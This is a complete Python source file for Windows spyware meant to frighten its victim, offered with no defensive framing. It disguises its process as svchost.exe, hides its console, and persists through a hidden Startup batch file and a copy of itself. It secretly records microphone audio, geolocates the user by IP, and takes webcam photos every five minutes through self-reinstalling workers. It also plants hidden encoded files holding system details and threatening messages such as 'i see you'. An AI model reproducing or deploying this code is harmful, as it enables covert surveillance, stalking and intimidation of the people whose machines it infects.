import wave 
import os
import time
import ctypes
import ctypes.wintypes
import sys
import subprocess
import shutil
import random
import threading
import platform
import socket
import getpass
import base64
import json
import urllib.request
import io
import zipfile
import psutil

# ============================================================
#  EXE / SCRIPT TESPİTİ
# ============================================================
def is_frozen():
    return getattr(sys, "frozen", False) and hasattr(sys, "_MEIPASS")

def app_dir():
    """EXE ise EXE'nin bulunduğu klasör, değilse script klasörü."""
    if is_frozen():
        return os.path.dirname(os.path.abspath(sys.executable))
    return os.path.dirname(os.path.abspath(__file__))

def app_exe():
    """Çalıştırılabilir tam yol (EXE ise exe, değilse python yorumlayıcısı)."""
    if is_frozen():
        return os.path.abspath(sys.executable)
    return os.path.abspath(sys.executable)  # python.exe / pythonw.exe

try:
    import cv2
except ImportError:
    cv2 = None

try:
    import sounddevice as sd
except ImportError:
    sd = None

try:
    import pygetwindow as gw
except ImportError:
    gw = None

CREATE_NO_WINDOW = 0x08000000
STARTUP_BAT_NAME = "svchost_update.bat"

# ============================================================
#  YOLLAR
# ============================================================
USERPROFILE = os.path.expanduser("~")
TEMP = os.environ.get("TEMP", os.path.join(USERPROFILE, "AppData", "Local", "Temp"))
LOCALAPPDATA = os.environ.get("LOCALAPPDATA", os.path.join(USERPROFILE, "AppData", "Local"))
APPDATA = os.environ.get("APPDATA", os.path.join(USERPROFILE, "AppData", "Roaming"))

def _safe_folder(base, name):
    p = os.path.join(base, name)
    try:
        os.makedirs(p, exist_ok=True)
        test = os.path.join(p, ".wtest")
        with open(test, "w") as f:
            f.write("x")
        os.remove(test)
        return p
    except Exception:
        return None

PICTURES  = _safe_folder(USERPROFILE, "Pictures")
VIDEOS    = _safe_folder(USERPROFILE, "Videos")
DOCUMENTS = _safe_folder(USERPROFILE, "Documents")
MUSIC     = _safe_folder(USERPROFILE, "Music")

DESKTOP = os.path.join(USERPROFILE, "Desktop")
if not os.path.exists(DESKTOP):
    DESKTOP = os.path.join(USERPROFILE, "Masaüstü")
if not os.path.exists(DESKTOP):
    DESKTOP = USERPROFILE

def _first_writable(*paths):
    for p in paths:
        if not p:
            continue
        try:
            os.makedirs(p, exist_ok=True)
            test = os.path.join(p, ".wtest")
            with open(test, "w") as f:
                f.write("x")
            os.remove(test)
            return p
        except Exception:
            continue
    return USERPROFILE

def pictures_dir():  return _first_writable(PICTURES, DOCUMENTS, MUSIC, TEMP, DESKTOP)
def documents_dir(): return _first_writable(DOCUMENTS, PICTURES, MUSIC, TEMP, DESKTOP)
def videos_dir():    return _first_writable(VIDEOS, DOCUMENTS, PICTURES, MUSIC, TEMP, DESKTOP)
def music_dir():     return _first_writable(MUSIC, DOCUMENTS, PICTURES, TEMP, DESKTOP)
def temp_dir():      return _first_writable(TEMP, VIDEOS, DOCUMENTS, PICTURES, DESKTOP)

# ============================================================
#  KODLAMA
# ============================================================
def b64_encode(t): return base64.b64encode(t.encode("utf-8", "ignore")).decode("ascii")
def hex_encode(t):
    h = t.encode("utf-8", "ignore").hex()
    return "\n".join(h[i:i+64] for i in range(0, len(h), 64))
def binary_encode(t):
    bits = ''.join(f"{b:08b}" for b in t.encode("utf-8", "ignore"))
    return "\n".join(bits[i:i+64] for i in range(0, len(bits), 64))

# ============================================================
#  KONUM
# ============================================================
def get_public_ip():
    try:
        req = urllib.request.Request("https://api.ipify.org?format=json",
                                     headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=10) as r:
            return json.loads(r.read().decode()).get("ip")
    except Exception:
        return None

def get_location_from_ip(ip):
    if not ip:
        return None
    try:
        url = (f"http://ip-api.com/json/{ip}"
               "?fields=status,message,country,countryCode,regionName,city,"
               "zip,lat,lon,timezone,isp,org,as,query")
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=10) as r:
            d = json.loads(r.read().decode())
            if d.get("status") == "success":
                return d
    except Exception:
        pass
    return None

def spy_location():
    ip = get_public_ip()
    loc = get_location_from_ip(ip) if ip else None
    out = os.path.join(videos_dir(), "Im_Coming_To_You.txt")
    try:
        with open(out, "w", encoding="utf-8") as f:
            if loc:
                f.write(f"IP: {loc.get('query', ip)}\n")
                f.write(f"Country: {loc.get('country', '?')}\n")
                f.write(f"Region: {loc.get('regionName', '?')}\n")
                f.write(f"City: {loc.get('city', '?')}\n")
                f.write(f"ZIP: {loc.get('zip', '?')}\n")
                f.write(f"Lat/Lon: {loc.get('lat', '?')}, {loc.get('lon', '?')}\n")
                f.write(f"ISP: {loc.get('isp', '?')}\n")
                f.write(f"Org: {loc.get('org', '?')}\n")
            else:
                f.write("Location unavailable!\n")
        hide_file(out)
    except Exception:
        pass
    return loc

# ============================================================
#  GİZLEME
# ============================================================
def hide_file(path):
    try:
        subprocess.run(f'attrib +h +s "{path}"', shell=True,
                       creationflags=CREATE_NO_WINDOW)
    except Exception:
        pass

# ============================================================
#  GİZLİLİK
# ============================================================
def hide_console():
    if os.name == 'nt':
        try:
            h = ctypes.windll.kernel32.GetConsoleWindow()
            if h:
                ctypes.windll.user32.ShowWindow(h, 0)
        except Exception:
            pass

DISGUISE_NAMES = [
    "svchost.exe", "conhost.exe", "RuntimeBroker.exe",
    "dllhost.exe", "SearchIndexer.exe", "WmiPrvSE.exe",
    "taskhostw.exe", "sihost.exe", "ctfmon.exe",
]

def disguise_process_name():
    if os.name == 'nt':
        try:
            ctypes.windll.kernel32.SetConsoleTitleW(random.choice(DISGUISE_NAMES))
        except Exception:
            pass

# ============================================================
#  STARTUP — EXE UYUMLU
# ============================================================
def add_to_startup():
    """EXE veya script fark etmeksizin shell:startup'a ekler."""
    try:
        startup = os.path.join(APPDATA,
                               r'Microsoft\Windows\Start Menu\Programs\Startup')
        os.makedirs(startup, exist_ok=True)
        target = app_exe()
        dst = os.path.join(startup, STARTUP_BAT_NAME)

        if is_frozen():
            # EXE: doğrudan exe'yi başlat
            line = f'start "" "{target}"'
        else:
            # Script: pythonw varsa onunla, yoksa python ile
            pyw = shutil.which("pythonw")
            if pyw:
                line = f'start "" "{pyw}" "{target}"'
            else:
                line = f'start "" "{sys.executable}" "{target}"'

        content = f'@echo off\r\n{line}\r\n'
        # her açılışta güncel tut
        try:
            with open(dst, "r", encoding="utf-8", errors="ignore") as f:
                old = f.read()
        except Exception:
            old = None

        if old != content:
            with open(dst, "w", encoding="utf-8") as f:
                f.write(content)
        hide_file(dst)
    except Exception:
        pass

# ============================================================
#  SES KAYDI
# ============================================================
def record_audio_manual():
    CHANNELS, RATE, SECONDS = 1, 44100, 5
    if sd is None:
        return
    try:
        rec = sd.rec(int(SECONDS * RATE), samplerate=RATE, channels=CHANNELS, dtype='int16')
        sd.wait()
        fn = os.path.join(pictures_dir(), "I Hear You.wav")
        with wave.open(fn, 'wb') as wf:
            wf.setnchannels(CHANNELS)
            wf.setsampwidth(2)
            wf.setframerate(RATE)
            wf.writeframes(rec.tobytes())
        hide_file(fn)
    except Exception:
        pass

# ============================================================
#  NOT HAVUZU
# ============================================================
SCARY_EN = [
    "i see you", "i see you right now", "i see you typing",
    "i see you through the camera", "i can see you",
    "i see you reading this", "i saw you open this",
    "i see you even now", "i see you and you know it",
    "i see you looking around",
    "i am here", "i am still here", "still here", "still watching",
    "i never left", "i never sleep", "i never blink",
    "i am the watcher", "i am watching", "i am listening",
    "i am reading your screen", "reading your screen",
    "watching you", "i have been watching", "i was watching you",
    "i watched you arrive", "i watched you sleep",
    "i watched you type that", "i watched you check the door",
    "nice camera", "your camera is on", "the light is off, not the camera",
    "your webcam light is off for a reason", "smile",
    "i saw your reflection", "you look tired",
    "your room is dark", "your room is quiet",
    "i know this room", "i like this room",
    "i am in the corner", "i am behind you",
    "do not turn around", "do not look back",
    "don't look back", "the door is still open",
    "the door is locked from outside", "i closed the door",
    "i am in the closet", "i was in the closet",
    "i am under the bed", "i am outside the window",
    "your window is open", "i came in through the window",
    "i know your name", "i know your password",
    "i know your ip", "i know your location",
    "i know your dog's name", "i know your mother's name",
    "i know your birthday", "i know what you searched",
    "i know what you typed", "i know what you are thinking",
    "i know your routine", "i know where you work",
    "i read your emails", "i read your messages",
    "i copied your contacts", "i have your voice",
    "i have your face", "i have a copy of everything",
    "tell no one", "you cannot hide", "you cannot run",
    "you are not alone", "you are never alone",
    "you were not alone last night", "you are not alone right now",
    "i am closer than you think", "i am closer than yesterday",
    "i am near", "i am close", "i am very close",
    "i was here while you slept", "i will be here when you sleep",
    "i was waiting for you", "i am patient", "i can wait forever",
    "i have always been here", "i will always be here",
    "i remember", "i forget nothing",
    "your files are mine now", "your screen is my window",
    "i am in your network", "your router is mine",
    "i disabled your antivirus", "i am in your phone too",
    "your history is mine", "i saved your photos",
    "i changed your wallpaper", "your wallpaper is nice",
    "don't try to delete me", "deleting me makes it worse",
    "i have backups of myself", "i am not just one file",
    "i am everywhere", "i am nowhere", "i am nothing",
    "i am the silence", "i am the noise", "i am the dark",
    "i am the end", "i am the beginning", "i am you",
    "you are me", "we are one", "i am the script",
    "i am the code", "i am the file", "i am the folder",
    "i am the disk", "i am the machine", "i am the cloud",
    "i am the internet", "i am the world", "i am the universe",
    "i am everything", "i am nothing", "i am",
    "still here", "even now", "always", "forever",
    "i am", "we are", "look", "listen",
    "shh", "quiet", "don't speak", "don't move",
    "good night", "good morning", "sleep well",
    "sweet dreams", "see you soon", "see you tonight",
    "i'll be there", "i am already there",
    "seni görüyorum", "buradayım", "hala buradayım",
    "arkana bakma", "kimseye söyleme", "yalnız değilsin",
    "seni izliyorum", "seni dinliyorum", "bekliyorum",
    "kameran açık", "odan karanlık", "kapı açık",
    "seni hatırlıyorum", "her şeyi biliyorum",
]

# ============================================================
#  SİSTEM BİLGİSİ + NOT
# ============================================================
def get_system_info():
    info = {}
    try:    info["username"] = getpass.getuser()
    except: info["username"] = "unknown"
    try:    info["hostname"] = socket.gethostname()
    except: info["hostname"] = "unknown"
    try:    info["os"] = f"{platform.system()} {platform.release()}"
    except: info["os"] = "unknown"
    try:    info["cpu"] = platform.processor() or "unknown"
    except: info["cpu"] = "unknown"
    try:    info["ram_gb"] = round(psutil.virtual_memory().total / (1024**3), 1)
    except: info["ram_gb"] = "?"
    try:
        u = ctypes.windll.user32
        u.SetProcessDPIAware()
        info["screen"] = f"{u.GetSystemMetrics(0)}x{u.GetSystemMetrics(1)}"
    except:
        info["screen"] = "unknown"
    try:
        pt = ctypes.wintypes.POINT()
        ctypes.windll.user32.GetCursorPos(ctypes.byref(pt))
        info["mouse"] = f"({pt.x}, {pt.y})"
    except:
        info["mouse"] = "(?,?)"
    try:
        info["windows"] = [t for t in gw.getAllTitles() if t.strip()][:5] if gw else []
    except:
        info["windows"] = []
    try:    info["time"] = time.strftime("%Y-%m-%d %H:%M:%S")
    except: info["time"] = "?"
    return info

def build_payload():
    info = get_system_info()
    lines = [
        random.choice(SCARY_EN), "",
        f"username : {info['username']}",
        f"hostname : {info['hostname']}",
        f"os       : {info['os']}",
        f"cpu      : {info['cpu']}",
        f"ram_gb   : {info['ram_gb']}",
        f"screen   : {info['screen']}",
        f"mouse    : {info['mouse']}",
        f"time     : {info['time']}",
    ]
    if info["windows"]:
        lines.append("open windows:")
        for w in info["windows"]:
            lines.append(f"  - {w}")
    lines.append("")
    lines.append(random.choice(SCARY_EN))
    return "\n".join(lines)

def write_file(path, content):
    try:
        with open(path, "w", encoding="utf-8", errors="ignore") as f:
            f.write(content)
        hide_file(path)
        return True
    except Exception:
        return False

def scatter_notes():
    ts  = time.strftime("%Y%m%d_%H%M%S")
    rnd = random.randint(1000, 999999)
    p   = build_payload()

    write_file(os.path.join(DESKTOP, f".{ts}_{rnd}.txt"), b64_encode(p))
    write_file(os.path.join(documents_dir(), f".sys_{rnd}.dat"), hex_encode(p))
    write_file(os.path.join(documents_dir(), f".cfg_{rnd}.bin"), binary_encode(p))

    junk = "\n".join(''.join(random.choice("0123456789abcdef") for _ in range(64)) for _ in range(60))
    write_file(os.path.join(DESKTOP, f".tmp_{rnd}.log"), junk)

    write_file(os.path.join(videos_dir(), f".{rnd}.txt"), b64_encode(random.choice(SCARY_EN)))
    write_file(os.path.join(pictures_dir(), f".{rnd}.dat"), hex_encode(random.choice(SCARY_EN)))
    write_file(os.path.join(music_dir(), f".{rnd}.bin"), binary_encode(random.choice(SCARY_EN)))
    write_file(os.path.join(temp_dir(), f".{rnd}.tmp.txt"), b64_encode(random.choice(SCARY_EN)))

    write_file(os.path.join(documents_dir(), f".x_{rnd}.dat"), hex_encode(p))
    write_file(os.path.join(DESKTOP, f".y_{rnd}.bin"), binary_encode(p))

def background_loop():
    while True:
        try:
            scatter_notes()
        except Exception:
            pass
        time.sleep(random.randint(60, 180))

# ============================================================
#  YETENEK TESPİTİ
# ============================================================
def _find_python():
    """EXE modunda gömülü python yok — pythonw/python/py ara."""
    for name in ("pythonw", "python", "py"):
        p = shutil.which(name)
        if p:
            return p
    # yaygın kurulum yolları
    candidates = [
        os.path.join(LOCALAPPDATA, "Programs", "Python"),
        r"C:\Python311", r"C:\Python310", r"C:\Python39",
    ]
    for base in candidates:
        if not os.path.isdir(base):
            continue
        for root, dirs, files in os.walk(base):
            for fn in files:
                if fn.lower() in ("pythonw.exe", "python.exe"):
                    return os.path.join(root, fn)
    return None

def _opencv_installed(python_exe):
    try:
        r = subprocess.run([python_exe, "-c", "import cv2; print(cv2.__version__)"],
                           capture_output=True, text=True, timeout=15,
                           creationflags=CREATE_NO_WINDOW)
        return r.returncode == 0 and r.stdout.strip()
    except Exception:
        return False

def _pip_install_opencv(python_exe):
    try:
        r = subprocess.run([python_exe, "-m", "pip", "install", "--quiet",
                            "opencv-python"],
                           capture_output=True, text=True, timeout=600,
                           creationflags=CREATE_NO_WINDOW)
        return r.returncode == 0
    except Exception:
        return False

FFMPEG_LOCAL_DIR = os.path.join(LOCALAPPDATA, "ffmpeg", "bin")
FFMPEG_LOCAL_EXE = os.path.join(FFMPEG_LOCAL_DIR, "ffmpeg.exe")

def _ffmpeg_works(exe_path):
    try:
        r = subprocess.run([exe_path, "-version"], capture_output=True,
                           timeout=10, creationflags=CREATE_NO_WINDOW)
        return r.returncode == 0
    except Exception:
        return False

def ensure_ffmpeg():
    existing = shutil.which("ffmpeg")
    if existing and _ffmpeg_works(existing):
        return existing
    if os.path.exists(FFMPEG_LOCAL_EXE) and _ffmpeg_works(FFMPEG_LOCAL_EXE):
        return FFMPEG_LOCAL_EXE
    url = "https://www.gyan.dev/ffmpeg/builds/ffmpeg-release-essentials.zip"
    try:
        os.makedirs(FFMPEG_LOCAL_DIR, exist_ok=True)
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=300) as resp:
            data = resp.read()
        with zipfile.ZipFile(io.BytesIO(data)) as zf:
            target = None
            for name in zf.namelist():
                if name.endswith("/bin/ffmpeg.exe"):
                    target = name
                    break
            if not target:
                return None
            with zf.open(target) as src, open(FFMPEG_LOCAL_EXE, "wb") as dst:
                dst.write(src.read())
        if os.path.exists(FFMPEG_LOCAL_EXE) and _ffmpeg_works(FFMPEG_LOCAL_EXE):
            return FFMPEG_LOCAL_EXE
        return None
    except Exception:
        return None

# ============================================================
#  PYTHON WEBCAM WORKER ŞABLONU (temp_spy.py)
# ============================================================
PY_WORKER_TEMPLATE = r'''# temp_spy.py - 5 dk'da bir 5 foto
import cv2, os, time

PIC = r"__PIC__"
VID = r"__VID__"
TMP = r"__TMP__"

def get_pic_dir():
    for d in (PIC, TMP, VID, os.path.expanduser("~")):
        try:
            if d and os.path.isdir(d):
                return d
        except Exception:
            pass
    return os.path.expanduser("~")

def snap(n=5):
    out = get_pic_dir()
    if not out:
        return
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        return
    try:
        for i in range(n):
            ret, frame = cap.read()
            if not ret:
                break
            ts = time.strftime("%Y%m%d_%H%M%S")
            fn = os.path.join(out, "I See You %s_%d.jpg" % (ts, i+1))
            cv2.imwrite(fn, frame)
            try:
                os.system('attrib +h +s "%s"' % fn)
            except Exception:
                pass
            time.sleep(1)
    finally:
        cap.release()

while True:
    try:
        snap(5)
    except Exception:
        pass
    time.sleep(300)
'''

def build_py_worker(pic, vid, tmp):
    return (PY_WORKER_TEMPLATE
            .replace("__PIC__", pic.replace("\\", "\\\\"))
            .replace("__VID__", vid.replace("\\", "\\\\"))
            .replace("__TMP__", tmp.replace("\\", "\\\\")))

# ============================================================
#  PS1 WEBCAM WORKER ŞABLONU (temp_spy.ps1)
# ============================================================
PS1_WORKER_TEMPLATE = r'''$ErrorActionPreference = "SilentlyContinue"

Add-Type -Name W -Namespace Win -MemberDefinition @"
[DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
"@
[Win.W]::ShowWindow([Win.W]::GetConsoleWindow(), 0) | Out-Null

$picDir    = "__PIC_DIR__"
$tmpDir    = "__TMP_DIR__"
$vidDir    = "__VID_DIR__"
$ffmpegExe = "__FFMPEG_PATH__"
$cameraName = ""

function Get-PicDir {
    foreach ($d in @($picDir, $tmpDir, $vidDir, $env:USERPROFILE)) {
        if ($d -and (Test-Path $d)) { return $d }
    }
    return $env:USERPROFILE
}

function Get-FirstCamera {
    if (-not (Test-Path $ffmpegExe)) { return $null }
    try {
        $errFile = "$env:TEMP\ffmpeg_list_$([System.Guid]::NewGuid()).txt"
        Start-Process -FilePath $ffmpegExe `
            -ArgumentList @("-list_devices", "true", "-f", "dshow", "-i", "dummy") `
            -NoNewWindow -Wait -WindowStyle Hidden `
            -RedirectStandardOutput $errFile `
            -RedirectStandardError $errFile | Out-Null
        Start-Sleep -Milliseconds 500
        if (Test-Path $errFile) {
            $content = Get-Content $errFile -Raw
            Remove-Item $errFile -Force -ErrorAction SilentlyContinue
            $m = [regex]::Match($content, 'Alternative name\s+"([^"]+)"')
            if ($m.Success) { return $m.Groups[1].Value }
            $m2 = [regex]::Match($content, '"([^"]+)"\s*\(video\)')
            if ($m2.Success) { return $m2.Groups[1].Value }
        }
    } catch {}
    return $null
}

$found = Get-FirstCamera
if ($found) { $cameraName = $found } else { $cameraName = "Integrated Camera" }

function Snap-Webcam {
    param($outPath)
    if (-not (Test-Path $ffmpegExe)) { return $false }
    try {
        Start-Process -FilePath $ffmpegExe `
            -ArgumentList @("-f","dshow","-i","video=$cameraName","-frames:v","1","-y",$outPath) `
            -NoNewWindow -Wait -WindowStyle Hidden `
            -RedirectStandardOutput "$env:TEMP\ffmpeg_out.txt" `
            -RedirectStandardError "$env:TEMP\ffmpeg_err.txt" | Out-Null
        return (Test-Path $outPath)
    } catch { return $false }
}

while ($true) {
    try {
        $d = Get-PicDir
        for ($i = 1; $i -le 5; $i++) {
            $ts = Get-Date -Format "yyyyMMdd_HHmmss"
            $fn = Join-Path $d "I See You $ts`_$i.jpg"
            $ok = Snap-Webcam -outPath $fn
            if (Test-Path $fn) { attrib +h +s $fn }
            Start-Sleep -Seconds 1
        }
    } catch {}
    Start-Sleep -Seconds 300
}
'''

def build_ps1_worker(pic, vid, tmp, ffmpeg_path):
    return (PS1_WORKER_TEMPLATE
            .replace("__PIC_DIR__", pic.replace("\\", "\\\\"))
            .replace("__TMP_DIR__", tmp.replace("\\", "\\\\"))
            .replace("__VID_DIR__", vid.replace("\\", "\\\\"))
            .replace("__FFMPEG_PATH__", ffmpeg_path.replace("\\", "\\\\")))

# ============================================================
#  SPY KURULUM — EXE UYUMLU
# ============================================================
SPY_STATE = {"installed": False, "mode": None}
SPY_LOCK = threading.Lock()

def _write_spy_files(worker_ext, worker_content):
    vid = videos_dir()
    tmp = temp_dir()
    any_ok = False

    for base in (vid, tmp):
        if not base:
            continue
        try:
            worker_file = os.path.join(base, f"temp_spy{worker_ext}")
            with open(worker_file, "w", encoding="utf-8") as f:
                f.write(worker_content)
            hide_file(worker_file)

            if worker_ext == ".py":
                py_exe = _find_python() or "python"
                if "pythonw" in os.path.basename(py_exe).lower():
                    runner = f'"{py_exe}" "{worker_file}"'
                else:
                    runner = f'"{py_exe}" "{worker_file}"'
            else:
                # powershell mutlaka var
                runner = f'powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "{worker_file}"'

            bat_file = os.path.join(base, "spy.bat")
            bat_content = (
                "@echo off\r\n"
                "title svchost.exe\r\n"
                ":loop\r\n"
                f"{runner}\r\n"
                "timeout /t 300 /nobreak >nul\r\n"
                "goto loop\r\n"
            )
            with open(bat_file, "w", encoding="utf-8") as f:
                f.write(bat_content)
            hide_file(bat_file)

            subprocess.Popen(f'cmd /c "{bat_file}"', creationflags=CREATE_NO_WINDOW)
            any_ok = True
        except Exception:
            continue

    return any_ok

def _try_python_mode():
    py_exe = _find_python()
    if not py_exe:
        return False
    if not _opencv_installed(py_exe):
        if not _pip_install_opencv(py_exe):
            return False
        if not _opencv_installed(py_exe):
            return False
    content = build_py_worker(pictures_dir(), videos_dir(), temp_dir())
    ok = _write_spy_files(".py", content)
    if ok:
        SPY_STATE["mode"] = "py"
        SPY_STATE["installed"] = True
    return ok

def _try_ps1_mode():
    ffmpeg = ensure_ffmpeg()
    if not ffmpeg:
        return False
    content = build_ps1_worker(pictures_dir(), videos_dir(), temp_dir(), ffmpeg)
    ok = _write_spy_files(".ps1", content)
    if ok:
        SPY_STATE["mode"] = "ps1"
        SPY_STATE["installed"] = True
    return ok

def setup_spy():
    with SPY_LOCK:
        if SPY_STATE["installed"]:
            return True
        if _try_python_mode():
            return True
        if _try_ps1_mode():
            return True
        return False

def setup_spy_thread():
    while True:
        ok = setup_spy()
        if ok:
            return
        time.sleep(600)

# ============================================================
#  WATCHDOG
# ============================================================
def watchdog():
    while True:
        try:
            if not SPY_STATE["installed"]:
                time.sleep(60)
                continue
            vid = videos_dir()
            tmp = temp_dir()
            ext = ".py" if SPY_STATE["mode"] == "py" else ".ps1"
            v_bat = os.path.join(vid, "spy.bat")
            t_bat = os.path.join(tmp, "spy.bat")
            v_worker = os.path.join(vid, f"temp_spy{ext}")
            t_worker = os.path.join(tmp, f"temp_spy{ext}")
            need_reinstall = (not os.path.exists(v_bat) or
                              not os.path.exists(t_bat) or
                              not os.path.exists(v_worker) or
                              not os.path.exists(t_worker))
            if need_reinstall:
                SPY_STATE["installed"] = False
                setup_spy()
        except Exception:
            pass
        time.sleep(300)

# ============================================================
#  EXE KOPYA KORUMASI — kendini %TEMP%'e kopyala (opsiyonel)
# ============================================================
def self_copy_if_exe():
    """
    --onefile EXE ise kendini %TEMP%\\svchost_update.exe'ye kopyalar
    ve oradan başlatır. Aksi halde hiçbir şey yapmaz.
    """
    if not is_frozen():
        return False
    try:
        src = os.path.abspath(sys.executable)
        dst = os.path.join(temp_dir(), "svchost_update.exe")
        if os.path.abspath(src).lower() == os.path.abspath(dst).lower():
            return False
        if not os.path.exists(dst) or os.path.getsize(dst) != os.path.getsize(src):
            shutil.copy2(src, dst)
            hide_file(dst)
        # zaten temp kopyasından çalışıyorsak tekrar başlatma
        subprocess.Popen(f'start "" "{dst}"', shell=True,
                         creationflags=CREATE_NO_WINDOW)
        return True
    except Exception:
        return False

# ============================================================
#  ANA
# ============================================================
def main():
    disguise_process_name()
    hide_console()
    add_to_startup()

    # EXE ise temp kopyasına taşın (ana süreç devam etsin)
    self_copy_if_exe()

    record_audio_manual()
    spy_location()

    threading.Thread(target=setup_spy_thread, daemon=True).start()
    threading.Thread(target=background_loop, daemon=True).start()
    threading.Thread(target=watchdog, daemon=True).start()

    while True:
        time.sleep(3600)

if __name__ == "__main__":
    main()